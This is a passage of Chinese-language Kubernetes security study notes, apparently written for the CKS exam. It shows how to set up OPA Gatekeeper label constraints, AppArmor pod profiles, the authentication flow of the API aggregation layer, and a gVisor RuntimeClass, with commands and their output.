class=\"code\"><pre><span class=\"line\">https://www.openpolicyagent.org/docs/latest/kubernetes-tutorial/</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"GateKeeper\"><a href=\"#GateKeeper\" class=\"headerlink\" title=\"GateKeeper\"></a>GateKeeper</h2><p>gatekeeper经历了3个版本，版本一就是步骤繁琐的原始OPA方案：</p>\n<p><img src=\"/linkimage/cksknowledge/opa.png\" alt=\"rbac角色\"></p>\n<p>这个版本中，opa和kube-mgmt是作为两个container，部署在同一个pod中。其中mgmt用来拉取所需的resource给opa， 并watch apiserver以便第一时间拉取更新的resource。opa则拉取bundle，bundle中包含rego语言定义的规则。这个版本最繁琐的就是你得自己创建svc(http就可以)来提供bundle的拉取服务，另外我们还得自己注册webhook，为了webhook的安全访问，我们还得为opa签发一个证书。</p>\n<p>gatekeeper的版本二我们就不看了，版本三是目前最新的一个版本：</p>\n<p><img src=\"/linkimage/cksknowledge/gatekeeper-v3.png\" alt=\"rbac角色\"></p>\n<p>gatekeeper v3是在opa外部包了一层，不再使用mgmt。所以gatekeeper自己要做这么几件事：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">一个是原来mgmt的工作，watch并拉取resources；</span><br><span class=\"line\"></span><br><span class=\"line\">一个是新增两类CRD，一类是模板CRD(即ConstraintTemplate)，定义了规则，另一类是参数CRD(即Constraint)，这个CRD定义了规则的参数；</span><br><span class=\"line\"></span><br><span class=\"line\">一个是作为apiserver和opa之间的桥梁，gatekeeper和opa是运行在同一个进程的，opa作为一个库集成；gatekeeper对opa的包含关系是gatekeeper(opaframework(opa(rego()))) 。</span><br></pre></td></tr></table></figure>\n\n<p>gatekeeper内部存储了所有的模板CRD和参数CRD，同时gatekeeper自己注册为webhook， 然后根据apiserver传过来的对象执行OPA的Query操作，query操作会拿出所有的模板CRD和参数CRD，触发模板CRD中的rego定义中的violation进行一一检查。</p>\n<p>另外gatekeeper还具有审计功能，能检查全部相关resource（包括在应用gatekeeper之前的）是否符合约束。 违反约束的都在参数crd的.status.violations字段下。</p>\n<p>用法如下，我们创建一个namespace的约束，要求namespace必须具有owner和usage两个lables：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># install</span><br><span class=\"line\">~$ kl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.7/deploy/gatekeeper.yaml</span><br><span class=\"line\">namespace/gatekeeper-system created</span><br><span class=\"line\">resourcequota/gatekeeper-critical-pods created</span><br><span class=\"line\">customresourcedefinition.apiextensions.k8s.io/assign.mutations.gatekeeper.sh created</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># apply 模板CRD</span><br><span class=\"line\">~$ vi ConstraintTemplate.yaml</span><br><span class=\"line\">apiVersion: templates.gatekeeper.sh/v1beta1</span><br><span class=\"line\">kind: ConstraintTemplate</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: k8srequiredlabels</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  crd:</span><br><span class=\"line\">    spec:</span><br><span class=\"line\">      names:</span><br><span class=\"line\">        kind: K8sRequiredLabels</span><br><span class=\"line\">      validation:</span><br><span class=\"line\">        # Schema for the `parameters` field</span><br><span class=\"line\">        openAPIV3Schema:</span><br><span class=\"line\">          properties:</span><br><span class=\"line\">            labels:</span><br><span class=\"line\">              type: array</span><br><span class=\"line\">              items: string</span><br><span class=\"line\">  targets:</span><br><span class=\"line\">    - target: admission.k8s.gatekeeper.sh</span><br><span class=\"line\">      rego: |</span><br><span class=\"line\">        package k8srequiredlabels</span><br><span class=\"line\"></span><br><span class=\"line\">        violation[&#123;&quot;msg&quot;: msg, &quot;details&quot;: &#123;&quot;missing_labels&quot;: missing&#125;&#125;] &#123;</span><br><span class=\"line\">          provided := &#123;label | input.review.object.metadata.labels[label]&#125;</span><br><span class=\"line\">          required := &#123;label | label := input.parameters.labels[_]&#125;</span><br><span class=\"line\">          missing := required - provided</span><br><span class=\"line\">          count(missing) &gt; 0</span><br><span class=\"line\">          msg := sprintf(&quot;you must provide labels: %v&quot;, [missing])</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        </span><br><span class=\"line\">~$ kl apply -f ConstraintTemplate.yaml </span><br><span class=\"line\">constrainttemplate.templates.gatekeeper.sh/k8srequiredlabels created</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># apply 参数CRD</span><br><span class=\"line\">~$ vi Constraint.yaml</span><br><span class=\"line\">apiVersion: constraints.gatekeeper.sh/v1beta1</span><br><span class=\"line\">kind: K8sRequiredLabels</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: ns-must-have-owner-usage</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  match:</span><br><span class=\"line\">    kinds:</span><br><span class=\"line\">      - apiGroups: [&quot;&quot;]</span><br><span class=\"line\">        kinds: [&quot;Namespace&quot;]</span><br><span class=\"line\">  parameters:</span><br><span class=\"line\">    labels: [&quot;owner&quot;,&quot;usage&quot;]</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">~$ kl apply -f Constraint.yaml </span><br><span class=\"line\">k8srequiredlabels.constraints.gatekeeper.sh/ns-must-have-owner-usage created</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># test ns creation</span><br><span class=\"line\">% kl create ns xx</span><br><span class=\"line\">Error from server ([ns-must-have-owner-usage] you must provide labels: &#123;&quot;owner&quot;, &quot;usage&quot;&#125;): admission webhook &quot;validation.gatekeeper.sh&quot; denied the request: [ns-must-have-owner-usage] you must provide labels: &#123;&quot;owner&quot;, &quot;usage&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用感受是，这个比原生的opa(即gatekeeper v1)要好用。<br>相同点是都免不了需要编写rego规则，这点还是比较烦人，因为有学习成本。<br>相对原生opa，省掉的步骤有两个，不用在去手动注册webhook了；并且由于可以通过CRD动态修改规则，因此不需要再手动启动一个service去挂bundle供下载。<br>可以看到已经自动注册了一个webhoook：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl get ValidatingWebhookConfiguration</span><br><span class=\"line\">NAME                                          WEBHOOKS   AGE</span><br><span class=\"line\">gatekeeper-validating-webhook-configuration   2          5m36s</span><br><span class=\"line\">ingress-nginx-admission                       1          4d5h</span><br></pre></td></tr></table></figure>\n\n<p>还可以看到原先的ns不满足约束：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl get K8sRequiredLabels  -ojsonpath=&#x27;&#123;.items[*].status.violations&#125;&#x27; | jq</span><br><span class=\"line\">[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;enforcementAction&quot;: &quot;deny&quot;,</span><br><span class=\"line\">    &quot;kind&quot;: &quot;Namespace&quot;,</span><br><span class=\"line\">    &quot;message&quot;: &quot;you must provide labels: &#123;\\&quot;owner\\&quot;, \\&quot;usage\\&quot;&#125;&quot;,</span><br><span class=\"line\">    &quot;name&quot;: &quot;kube-system&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">\t......</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"AppArmor\"><a href=\"#AppArmor\" class=\"headerlink\" title=\"AppArmor\"></a>AppArmor</h2><p>AppArmor配置一个程序拥有的权限，能做的事，不能做的事。 </p>\n<p>要能起作用，必须是内核打开了开关，同时要预先加载你想要的profile。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/tutorials/clusters/apparmor/ </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># check if kernel support enabled</span><br><span class=\"line\"></span><br><span class=\"line\">~$ cat /sys/module/apparmor/parameters/enabled</span><br><span class=\"line\">Y</span><br><span class=\"line\"></span><br><span class=\"line\"># 或者</span><br><span class=\"line\">~$ kubectl get nodes -o=jsonpath=$&#x27;&#123;range .items[*]&#125;&#123;@.metadata.name&#125;: &#123;.status.conditions[?(@.reason==&quot;KubeletReady&quot;)].message&#125;\\n&#123;end&#125;&#x27;</span><br><span class=\"line\">server1: kubelet is posting ready status. AppArmor enabled</span><br><span class=\"line\">server2: kubelet is posting ready status. AppArmor enabled</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># check profile already loaded</span><br><span class=\"line\"># profile在这里就是指的一个apparmor规则文件</span><br><span class=\"line\"></span><br><span class=\"line\">~$ sudo cat /sys/kernel/security/apparmor/profiles</span><br><span class=\"line\">cri-containerd.apparmor.d (enforce)</span><br><span class=\"line\">/snap/snapd/13269/usr/lib/snapd/snap-confine (enforce)</span><br><span class=\"line\">/snap/snapd/13269/usr/lib/snapd/snap-confine//mount-namespace-capture-helper (enforce)</span><br><span class=\"line\">snap.lxd.lxd (enforce)</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 或者</span><br><span class=\"line\">~$ sudo apparmor_status</span><br><span class=\"line\">apparmor module is loaded.</span><br><span class=\"line\">32 profiles are loaded.</span><br><span class=\"line\">32 profiles are in enforce mode.</span><br><span class=\"line\">   /snap/snapd/13269/usr/lib/snapd/snap-confine</span><br><span class=\"line\">   /snap/snapd/13269/usr/lib/snapd/snap-confine//mount-namespace-capture-helper</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># how to load profile</span><br><span class=\"line\">加载profile可以把profile放到/etc/apparmor.d/下开机自动加载,</span><br><span class=\"line\">或者执行apparmor_parser filename手动每次加载。</span><br><span class=\"line\"></span><br><span class=\"line\"># how to unload profile</span><br><span class=\"line\">apparmor_parser -R filename</span><br></pre></td></tr></table></figure>\n\n<p>apparmor的配置方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">第一种配置方式是通过在pod的annotations中添加配置来实现的。</span><br><span class=\"line\">  annotations:</span><br><span class=\"line\">    container.apparmor.security.beta.kubernetes.io/containerName: xxxx</span><br><span class=\"line\">    </span><br><span class=\"line\">containerName是实际的容器的name；xxxx这里支持3种值。</span><br><span class=\"line\">1. runtime/default，默认的profile。</span><br><span class=\"line\">\t和留空不配annotation是等价的（在启动了apparmor和没在psp配置apparmor的情况下）。</span><br><span class=\"line\">2. localhost/&lt;profile_name&gt;， 就是加载本机的apparmor规则。</span><br><span class=\"line\">3. unconfined， 不应用任何apparmor规则。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">第二种配置方式是在psp中配置，psp我们前面已经介绍过。</span><br><span class=\"line\">如果PSP启动了，那么可以在psp中配置全局的apparmor，影响范围是psp被pod选中的时候的那些pod。</span><br><span class=\"line\">可以在psp中配置annotations：</span><br><span class=\"line\">apparmor.security.beta.kubernetes.io/defaultProfileName: &lt;profile_ref&gt;</span><br><span class=\"line\">apparmor.security.beta.kubernetes.io/allowedProfileNames: &lt;profile_ref&gt;[,others...]</span><br><span class=\"line\"></span><br><span class=\"line\">defaultProfileName是没有配置apparmor的时候默认应用的profile。</span><br><span class=\"line\">allowedProfileNames是pod中允许使用的profile。</span><br><span class=\"line\">如果default和allowed都配了，allowed必须包含default这个profile。</span><br><span class=\"line\">The default profile name option specifies the profile to apply to containers by default when none is specified. The allowed profile names option specifies a list of profiles that Pod containers are allowed to be run with. If both options are provided, the default must be allowed.</span><br></pre></td></tr></table></figure>\n\n<p>使用举例, 创建一个应用了apparmor的pod：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># create yaml</span><br><span class=\"line\">~$ vi busyapparmor.yaml</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: null</span><br><span class=\"line\">  labels:</span><br><span class=\"line\">    run: busy1</span><br><span class=\"line\">  name: busy1</span><br><span class=\"line\">  annotations:</span><br><span class=\"line\">    container.apparmor.security.beta.kubernetes.io/busy1: localhost/k8s-apparmor-example-deny-write</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  containers:</span><br><span class=\"line\">  - image: busybox</span><br><span class=\"line\">    name: busy1</span><br><span class=\"line\">    command:</span><br><span class=\"line\">    - sh</span><br><span class=\"line\">    - -c</span><br><span class=\"line\">    - &quot;echo &#x27;AABBCC&#x27; &amp;&amp; sleep 1h&quot;</span><br><span class=\"line\">    resources: &#123;&#125;</span><br><span class=\"line\">  dnsPolicy: ClusterFirst</span><br><span class=\"line\">  restartPolicy: Never</span><br><span class=\"line\">status: &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># apply yaml</span><br><span class=\"line\">~$ kl apply -f busyapparmor.yaml </span><br><span class=\"line\">pod/busy1 created</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># check pod status</span><br><span class=\"line\">~$ kl get pod</span><br><span class=\"line\">NAME        READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">busy1       0/1     Blocked   0          50s</span><br><span class=\"line\">可以看到pod的状态是Blocked,并且可以从message看到错误信息：</span><br><span class=\"line\">~$ kl get pod busy1 -o jsonpath=&#x27;&#123;.status.message&#125;&#x27;</span><br><span class=\"line\">Cannot enforce AppArmor: profile &quot;k8s-apparmor-example-deny-write&quot; is not loaded</span><br><span class=\"line\"></span><br><span class=\"line\">可以看到因为profile没有加载，所以pod无法成功启动。</span><br><span class=\"line\">现在我们要做的是在server2中加载profile，然后给server2配置label，然后给pod配置nodeSelector,这样就可以确保pod被加载到server2中.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">~$ vi deny_write.profile</span><br><span class=\"line\">#include &lt;tunables/global&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">profile k8s-apparmor-example-deny-write flags=(attach_disconnected) &#123;</span><br><span class=\"line\">  #include &lt;abstractions/base&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  file,</span><br><span class=\"line\"></span><br><span class=\"line\">  # Deny all file writes.</span><br><span class=\"line\">  deny /** w,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">~$ sudo apparmor_parser deny_write.profile</span><br><span class=\"line\">~$ kl label node server2 profile=k8s-apparmor-example-deny-write</span><br><span class=\"line\">node/server2 labeled</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">~$ vi busyapparmor.yaml</span><br><span class=\"line\"># 添加nodeSelecctor</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: null</span><br><span class=\"line\">  labels:</span><br><span class=\"line\">    run: busy1</span><br><span class=\"line\">  name: busy1</span><br><span class=\"line\">  annotations:</span><br><span class=\"line\">    container.apparmor.security.beta.kubernetes.io/busy1: localhost/k8s-apparmor-example-deny-write</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  nodeSelector:</span><br><span class=\"line\">    profile: k8s-apparmor-example-deny-write</span><br><span class=\"line\">  containers:</span><br><span class=\"line\">  - image: busybox</span><br><span class=\"line\">    name: busy1</span><br><span class=\"line\">    command:</span><br><span class=\"line\">    - sh</span><br><span class=\"line\">    - -c</span><br><span class=\"line\">    - &quot;echo &#x27;AABBCC&#x27; &amp;&amp; sleep 1h&quot;</span><br><span class=\"line\">    resources: &#123;&#125;</span><br><span class=\"line\">  dnsPolicy: ClusterFirst</span><br><span class=\"line\">  restartPolicy: Never</span><br><span class=\"line\">status: &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl apply -f busyapparmor.yaml --force</span><br><span class=\"line\">pod/busy1 configured</span><br><span class=\"line\"></span><br><span class=\"line\"># 重新查看pod的状态</span><br><span class=\"line\">~$ kl get pod -owide</span><br><span class=\"line\">NAME        READY   STATUS    RESTARTS   AGE   IP              NODE      NOMINATED NODE   READINESS GATES</span><br><span class=\"line\">busy1       1/1     Running   0          21s   10.244.192.10   server2   &lt;none&gt;           &lt;none&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">可以看到pod已经成功在server2上面执行了。</span><br><span class=\"line\">通过执行下面命令可以doubel check加载profile成功了。</span><br><span class=\"line\">~$ kl exec busy1 -- cat /proc/1/attr/current</span><br><span class=\"line\">k8s-apparmor-example-deny-write (enforce)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"IAM-Identity-and-Access-Management\"><a href=\"#IAM-Identity-and-Access-Management\" class=\"headerlink\" title=\"IAM(Identity and Access Management)\"></a>IAM(Identity and Access Management)</h2><p>介绍k8s中认证方面的一些知识，考试不会直接考到，就是属于了解一下k8s的知识。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 资料</span><br><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/authentication/</span><br><span class=\"line\">https://kubernetes.io/docs/tasks/extend-kubernetes/configure-aggregation-layer/#authentication-flow</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 用户类型</span><br><span class=\"line\">All Kubernetes clusters have two categories of users: service accounts managed by Kubernetes, and normal users.</span><br><span class=\"line\">SA是在k8s集群内部管理的，user是外部管理的。</span><br><span class=\"line\"></span><br><span class=\"line\"># 认证方式</span><br><span class=\"line\">我现在只知道X509 cert client/service account/openid connect(OIDC)这几个认证方式。</span><br><span class=\"line\">除了sa，其他的都属于user。</span><br><span class=\"line\"></span><br><span class=\"line\"># 认证形式</span><br><span class=\"line\">而认证形式我知道的包括X509 cert client/token(包括static token,bootstrap token,sa token,openid token)/aggregator proxy</span><br><span class=\"line\">Kubernetes uses client certificates, bearer tokens, or an authenticating proxy to authenticate API requests through authentication plugins。</span><br><span class=\"line\"></span><br><span class=\"line\"># aggregator proxy(集合层)的实现机制</span><br><span class=\"line\">aggregator proxy是在apiserver实现的一个扩展机制，允许它把请求转发给另一个服务。</span><br><span class=\"line\">从角色上来说包含apiserver handler和extension server handler两个， apiserver handler会把部分请求转发给extension server，这个extension server有自己的CA，在apiserver handler转发给extension的时候会使用对应的client cert，</span><br><span class=\"line\">同时在http header中带上客户端的用户名等信息，这样extension就不需要再验证一遍了。</span><br><span class=\"line\">转发的时候用到了apiserver的这几个参数</span><br><span class=\"line\">- --requestheader-allowed-names=front-proxy-client # 证书中的CN</span><br><span class=\"line\">- --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt</span><br><span class=\"line\">- --requestheader-extra-headers-prefix=X-Remote-Extra-</span><br><span class=\"line\">- --requestheader-group-headers=X-Remote-Group</span><br><span class=\"line\">- --requestheader-username-headers=X-Remote-User</span><br><span class=\"line\">所谓的proxy机制也就是extension server通过requestheader-client-ca-file这个独立的ca文件验证proxy(apiserver自己)的身份，随后信任proxy。</span><br><span class=\"line\">信任之后通过proxy携带的相关username等信息组合出用户的完整信息。这个机制用来扩展apiserver的功能，扩展功能都放在extension server。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"aggregator-proxy-集合层\"><a href=\"#aggregator-proxy-集合层\" class=\"headerlink\" title=\"aggregator proxy(集合层)\"></a>aggregator proxy(集合层)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/tasks/extend-kubernetes/configure-aggregation-layer/</span><br><span class=\"line\">https://itnext.io/our-journey-in-building-a-kubernetes-aggregated-api-server-29a4f9c1de22</span><br></pre></td></tr></table></figure>\n\n<p>集合层的机制上面提了，关于他的流程我们可以了解一下，他是apiserver实现的一个扩展机制。</p>\n<p>整个流程中涉及两个角色apiserver和extension server，为了同官方文档对应，我们叫他们aggregator以及aggregated。其中aggregated负责扩展某个功能。类比一下，就是aggregator监听某个路径下的请求，然后将它转发给aggregated，aggregated也就是一个扩展服务器。</p>\n<p>aggregated首先会将自己注册到aggregator上去，aggregator收到用户请求后先对请求进行认证和授权，认证流程跟正常一样，授权流程这里暂时只是检查有没有对这个路径的访问权限，路径则关联功能。然后aggregator把请求转发给aggregated，aggregated收到请求后，同样要经过认证和授权两个步骤。</p>\n<p>认证是使用证书的方式进行安全验证，aggregator需要携带证书来请求aggregated。授权则是从请求的http header中取出用户名用户组等信息，由于经过了认证，所以这里对于取出的header中信息的真实性就可以直接信任了，aggregated然后根据获取到的用户信息发送SujectAccessReview给aggregator进行授权，这里授权的则是这个用户有没有操作某个资源的权限，而不是刚才检查是否有路径的访问权限。授权通过的话就可以执行具体的业务。</p>\n<p>整个流程如图：</p>\n<p><img src=\"/linkimage/cksknowledge/aggregation-api-auth-flow.png\" alt=\"aggregation-api-auth-flow\"></p>\n<p>图片来自<a href=\"https://kubernetes.io/docs/tasks/extend-kubernetes/configure-aggregation-layer/\">Authentication Flow</a></p>\n<p>我们可以看到aggregated就是一个独立的服务，用来扩展apiserver，它只是把前期的认证阶段交给了原来的apiserver来做。</p>\n<h2 id=\"runtime-class\"><a href=\"#runtime-class\" class=\"headerlink\" title=\"runtime class\"></a>runtime class</h2><p>说到容器运行时，我们会想到docker，containerd，cri-o, 同时你也可能想到runc，gvisor，事实上，这几个都叫容器运行时，但是前者又是可以调用后者的，这就比较让人困惑了。所以通常来说，前者（docker，containerd，cri-o）我们叫它上层容器运行时（high-level container runtimes），后者（runc，gvisor）我们叫它底层容器运行时（low-level container runtimes）。如图：</p>\n<p><img src=\"/linkimage/cksknowledge/high_low_container_runtime.png\" alt=\"high-low-container-runtime\"></p>\n<p>图片来自<a href=\"https://zhuanlan.zhihu.com/p/338036211\">一文看懂 Container Runtime</a></p>\n<p>k8s支持使用指定的底层容器运行时，可以为某个pod指定是使用runc还是使用gvisor。要达到这个目的，首先要让上层容器运行时支持指定的底层容器运行时，这一步通过在主机中安装相应底层容器运行时，以及配置上层容器运行时来接入该底层运行时，来完成；另外就是需要在k8s中为指定的底层容器运行时创建对应的RuntimeClass资源（k8s中默认是没有RuntimeClass实例的，意味着默认是使用默认的底层运行时）。</p>\n<p>以接入新的底层运行时gvisor为例，我们可以这么做：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">首先安装另一个实现gvisor：</span><br><span class=\"line\"># https://gvisor.dev/docs/user_guide/install/</span><br><span class=\"line\"></span><br><span class=\"line\">~$ vi installgvisor.sh</span><br><span class=\"line\">(</span><br><span class=\"line\">  set -e</span><br><span class=\"line\">  ARCH=$(uname -m)</span><br><span class=\"line\">  URL=https://storage.googleapis.com/gvisor/releases/release/latest/$&#123;ARCH&#125;</span><br><span class=\"line\">  wget $&#123;URL&#125;/runsc $&#123;URL&#125;/runsc.sha512 \\</span><br><span class=\"line\">    $&#123;URL&#125;/containerd-shim-runsc-v1 $&#123;URL&#125;/containerd-shim-runsc-v1.sha512</span><br><span class=\"line\">  sha512sum -c runsc.sha512 \\</span><br><span class=\"line\">    -c containerd-shim-runsc-v1.sha512</span><br><span class=\"line\">  rm -f *.sha512</span><br><span class=\"line\">  chmod a+rx runsc containerd-shim-runsc-v1</span><br><span class=\"line\">  sudo mv runsc containerd-shim-runsc-v1 /usr/local/bin</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">~$ chmod +x installgvisor.sh</span><br><span class=\"line\">~$ ./installgvisor.sh</span><br><span class=\"line\">......</span><br><span class=\"line\">Total wall clock time: 38s</span><br><span class=\"line\">Downloaded: 4 files, 57M in 35s (1.61 MB/s)</span><br><span class=\"line\">runsc: OK</span><br><span class=\"line\">containerd-shim-runsc-v1: OK</span><br></pre></td></tr></table></figure>\n\n<p>然后配置containerd的配置文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">修改配置文件（不同的容器运行时使用不同的配置文件），containerd就是修改/etc/containerd/config.toml,其他运行时的修改可以参考文档：</span><br><span class=\"line\">https://kubernetes.io/docs/concepts/containers/runtime-class/</span><br><span class=\"line\"></span><br><span class=\"line\">~$ sudo vi /etc/containerd/config.toml</span><br><span class=\"line\"># 插入两行</span><br><span class=\"line\">#     [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runsc]</span><br><span class=\"line\">#       runtime_type = &quot;io.containerd.runsc.v1&quot;</span><br><span class=\"line\">......</span><br><span class=\"line\">      [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.default_runtime]</span><br><span class=\"line\">        base_runtime_spec = &quot;&quot;</span><br><span class=\"line\">        container_annotations = []</span><br><span class=\"line\">        pod_annotations = []</span><br><span class=\"line\">        privileged_without_host_devices = false</span><br><span class=\"line\">        runtime_engine = &quot;&quot;</span><br><span class=\"line\">        runtime_root = &quot;&quot;</span><br><span class=\"line\">        runtime_type = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">        [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.default_runtime.options]</span><br><span class=\"line\"></span><br><span class=\"line\">      [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runsc]</span><br><span class=\"line\">        runtime_type = &quot;io.containerd.runsc.v1&quot;</span><br><span class=\"line\">      </span><br><span class=\"line\">      [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes]</span><br><span class=\"line\"></span><br><span class=\"line\">        [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc]</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 然后重启containerd</span><br><span class=\"line\">~$ sudo systemctl daemon-reload</span><br><span class=\"line\">~$ sudo systemctl restart containerd</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后创建Runtime Class</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ vi runtimeclass.yaml</span><br><span class=\"line\">apiVersion: node.k8s.io/v1</span><br><span class=\"line\">kind: RuntimeClass</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: myclass  </span><br><span class=\"line\">handler: runsc</span><br><span class=\"line\"># 注意这里的runsc需要和/etc/containerd/config.toml中runtimes的配置对应的名字一样。</span><br><span class=\"line\">如果写的不对，这里不会报错，到最后用到的时候才会报错，导致pod启动失败。</span><br><span class=\"line\"></span><br><span class=\"line\"># 然后apply</span><br><span class=\"line\">~$ kl apply -f runtimeclass.yaml </span><br><span class=\"line\">runtimeclass.node.k8s.io/myclass created</span><br></pre></td></tr></table></figure>\n\n<p>然后在pod中使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ vi ng.yaml</span><br><span class=\"line\"># 注意nodeName和runtimeClassName两个字段</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: null</span><br><span class=\"line\">  labels:</span><br><span class=\"line\">    run: ng</span><br><span class=\"line\">  name: ng</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  nodeName: server2</span><br><span class=\"line\">  runtimeClassName: myclass</span><br><span class=\"line\">  containers:</span><br><span class=\"line\">  - image: nginx</span><br><span class=\"line\">    name: ng</span><br><span class=\"line\">    resources: &#123;&#125;</span><br><span class=\"line\">  dnsPolicy: ClusterFirst</span><br><span class=\"line\">  restartPolicy: Always</span><br><span class=\"line\">status: &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl apply -f ng.yaml</span><br><span class=\"line\">pod/ng created</span><br><span class=\"line\"></span><br><span class=\"line\">如果我们没有指定nodeName，然后pod又正好调度到了没有安装runsc的节点，那么pod会启动失败，并可以通过event看到提示：</span><br><span class=\"line\">~$ kl get event</span><br><span class=\"line\">LAST SEEN   TYPE      REASON                   OBJECT          MESSAGE</span><br><span class=\"line\">3s          Warning   FailedCreatePodSandBox   pod/ng          Failed to create pod sandbox: rpc error: code = Unknown desc = failed to get sandbox runtime: no runtime for &quot;runsc&quot; is configured</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">那么如何确认这个pod是使用了runsc呢？</span><br><span class=\"line\">可以进到pod中执行dmesg看到gVisor相关信息，就表示成功了。</span><br><span class=\"line\">~$ kl exec ng -- dmesg</span><br><span class=\"line\">[    0.000000] Starting gVisor...</span><br><span class=\"line\">[    0.171422] Searching for needles in stacks...</span><br><span class=\"line\">[    0.467189] Recruiting cron-ies...</span><br><span class=\"line\">[    0.859775] Letting the watchdogs out...</span><br><span class=\"line\">[    1.044028] Forking spaghetti code...</span><br><span class=\"line\">[    1.165573] Searching for socket adapter...</span><br><span class=\"line\">[    1.559524] Checking naughty and nice process list...</span><br><span class=\"line\">[    2.035042] Singleplexing /dev/ptmx...</span><br><span class=\"line\">[    2.493387] Reticulating splines...</span><br><span class=\"line\">[    2.965587] Generating random numbers by fair dice roll...</span><br><span class=\"line\">[    3.362163] Checking naughty and nice process list...</span><br><span class=\"line\">[    3.821549] Setting up VFS2...</span><br><span class=\"line\">[    3.868035] Ready!</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"缩小镜像\"><a href=\"#缩小镜像\" class=\"headerlink\" title=\"缩小镜像\"></a>缩小镜像</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span 